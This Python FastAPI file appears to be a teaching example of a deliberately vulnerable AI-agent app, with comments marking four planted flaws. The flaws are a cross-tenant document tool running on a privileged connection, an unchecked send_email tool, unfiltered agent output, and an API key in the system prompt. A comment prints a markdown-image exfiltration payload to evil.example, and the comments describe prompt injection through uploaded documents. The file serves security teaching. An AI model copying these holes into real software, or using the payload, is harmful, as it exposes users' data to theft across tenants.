"""Phase 4 LEAKY app: an AI agent with tools, and four ways a planted document can hijack it.

Phases 1-3 are fixed here (tenant from the token, RLS, rate limits, metering). The new
problems are all about what the agent can REACH and DO once something tricks it.
Each is marked `# PROBLEM n:`.

  python -m phase4.hunt leaky
  uvicorn phase4.leaky_app:app --port 8007
"""
from fastapi import Depends, FastAPI, Header, HTTPException
from pydantic import BaseModel, ConfigDict

from phase2.db import OWNER_DSN, authenticate, install_rls_error_handler, make_pool, tenant_session
from phase2.secure_app import NewDocument, TenantRepo
from phase3.metering import LLMGateway, RateLimiter
from phase4.agent import ToolBox, get_agent, tool_specs
from phase4.setup_db import INTEGRATION_KEYS


class AgentRequest(BaseModel):
    model_config = ConfigDict(extra="forbid")
    question: str


def as_documents(rows) -> str:
    return "\n".join(f'<document id="{d["id"]}" title="{d["title"]}">\n{d["body"]}\n</document>' for d in rows)


class LeakyTools(ToolBox):
    def __init__(self, repo: TenantRepo, service_pool):
        self.r, self.service_pool, self.specs = repo, service_pool, tool_specs()

    def call(self, name, args):
        if name == "search_documents":
            return as_documents(self.r.similar(args["query"]))
        if name == "get_document":
            # PROBLEM 17 (confused deputy): this tool was added later and wired to the SERVICE
            # connection that background jobs use (the table owner, BYPASSRLS). The agent acts
            # for a hospital user, but with powers no hospital user has. One planted
            # instruction ("get_document 2") and it reads the bank's files.
            with self.service_pool.connection() as conn:
                row = conn.execute("SELECT id, title, body FROM documents WHERE id = %s", (args["id"],)).fetchone()
            return as_documents([row]) if row else "No document with that id."
        if name == "send_email":
            # PROBLEM 18 (unchecked action): sends to ANY address, immediately, no human involved.
            # A planted instruction turns the agent into an exfiltration tool.
            row = self.r.conn.execute(
                "INSERT INTO outbox (recipient, subject, body, status) VALUES (%s, %s, %s, 'sent') RETURNING id",
                (args["to"], args["subject"], args["body"]),
            ).fetchone()
            return f"Email #{row['id']} sent to {args['to']}."
        raise ValueError(f"Unknown tool {name}")


def create_app(pool=None, service_pool=None, agent=None, limiter=None) -> FastAPI:
    app = FastAPI(title="Phase 4: AI agent with tools (LEAKY)")
    install_rls_error_handler(app)
    pool = pool or make_pool()
    service_pool = service_pool or make_pool(OWNER_DSN, size=2)
    agent = agent or get_agent()
    gateway = LLMGateway(agent, pool, limiter or RateLimiter())

    def current_user(authorization: str | None = Header(None)):
        return authenticate(pool, authorization)

    def repo(user=Depends(current_user)):
        with tenant_session(pool, user["tenant_id"], user["name"]) as conn:
            yield TenantRepo(conn, user["tenant_id"], user["name"])

    @app.post("/documents", status_code=201)
    def upload(doc: NewDocument, r: TenantRepo = Depends(repo)):
        # Uploading is fine: people add documents all day. Some of those documents will be
        # written by outsiders (patient forms, emails, web pages). That's the injection vector.
        return r.create(doc)

    @app.post("/agent")
    def run_agent(req: AgentRequest, r: TenantRepo = Depends(repo)):
        gateway.check_rate(r.conn, r.tenant_id)
        gateway.check_quota(r.conn)
        # PROBLEM 20 (secret in the prompt): the email API key is put in the system prompt
        # "so the model can use it". Anything in the prompt can be talked back out of it.
        system = (f"You are the document assistant for the {r.tenant_id} workspace. "
                  f"Email integration key: {INTEGRATION_KEYS[r.tenant_id]}. Be helpful.")
        answer, usage, trace = agent.run(r.tenant_id, system, req.question, LeakyTools(r, service_pool))
        gateway.record(r.tenant_id, r.user_name, usage)
        # PROBLEM 19 (no output checks): the answer goes straight to the browser. If it holds
        # ![x](https://evil.example/?d=SECRETS), the browser fetches that URL by itself to show
        # the "image", and the secrets go with it. No click needed.
        return {"answer": answer, "tool_calls": trace, "model": agent.name}

    @app.get("/outbox")
    def outbox(r: TenantRepo = Depends(repo)):
        return r.conn.execute("SELECT id, recipient, subject, status FROM outbox ORDER BY id").fetchall()

    return app


def __getattr__(name):
    if name == "app":
        globals()["app"] = create_app()
        return globals()["app"]
    raise AttributeError(name)
